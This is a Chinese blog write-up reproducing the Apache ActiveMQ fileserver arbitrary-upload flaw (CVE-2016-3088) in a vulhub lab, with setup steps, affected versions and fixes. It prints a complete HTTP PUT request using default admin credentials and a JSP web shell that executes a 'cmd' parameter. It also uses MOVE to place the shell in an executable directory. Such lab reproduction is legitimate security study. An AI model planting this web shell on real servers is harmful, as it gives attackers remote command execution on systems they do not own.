# ActiveMq PUT 任意文件上传漏洞（CVE-2016-3088）漏洞复现 - pipiqiu - 博客园

> 原文：[`www.cnblogs.com/lijingrong/p/13672092.html`](https://www.cnblogs.com/lijingrong/p/13672092.html)

## 漏洞原理

该漏洞出现在 fileserver 应用中,ActiveMQ 中的 fileserver 服务允许用户通过 HTTP PUT 方法上传文件到指定目录。Fileserver 支持写入文件(不解析 jsp),但是支持移动文件(Move)我们可以将 jsp 的文件 PUT 到 Fileserver 下,然后再通过 Move 指令移动到可执行目录下访问

## 环境搭建

使用 vulhub 一键搭建，靶机 kali：192.168.1771.37

```
docker-compose up -d
```

环境搭建成功，浏览器访问：http://IP:8161

![](img/b3ed2f14a909bef0c2007ef8e2e0474c.png)

![](img/bd936fe5711593daf8074baf6b3c9281.png)

## 漏洞复现

登录 admin 账号：默认账号 admin/admin，抓包进行修改，使用 PUT 方法上传文件。ActiveMQ Web 控制台分为三个应用程序：其中 admin，api 和 fileserver，其中 admin 是管理员页面，api 是界面，fileserver 是用于存储文件的界面；admin 和 api 需要先登录才能使用，fileserver 不需要登录。

 上传 jsp 文件（系统不稳定，有时成功有时失败），

 ![](img/863ce0626bc77685e5321c0b87ffdcc0.png)

```
PUT /fileserver/2.jsp HTTP/1.1 Host: 192.168.177.137:8161 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: JSESSIONID=18wws8yzr1a04iz9gfpkkar3p
Authorization: Basic YWRtaW46YWRtaW4=
X-Forwarded-For: 8.8.8.8
Connection: close
Content-Length: 329

<%@ page import="java.io.*"%>
<%
 out.print("Hello</br>");
 String strcmd=request.getParameter("cmd");
 String line=null;
 Process p=Runtime.getRuntime().exec(strcmd);
 BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
 while((line=br.readLine())!=null){
 out.print(line+"</br>");
 }
%>
```

![](img/56ef9d62911bc06550bed2e7d855d63f.png)

 使用 MOVE 方法移动文件，成功的包没截上，再次上传是 500 回显，文件已经上传成功，访问地址，成功解析 jsp

![](img/ea46fd798d03fc6fe50cc87a94902eac.png)

 ![](img/d95a0c1245bad598d7ff391d50afe76a.png)

## 漏洞影响

漏洞影响版本：Apache ActiveMQ 5.x ~ 5.14.0

## 漏洞修复

1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。

2、通过移除 `conf\jetty.xml` 的以下配置来禁用 ActiveMQ Fileserver 功能

 ![](img/1bde78d28576eef2b2a2623bec5b209d.png)

## 参考文献

https://paper.seebug.org/346/

https://blog.csdn.net/yukinorong/article/details/106942279

https://www.jb51.net/article/167145.htm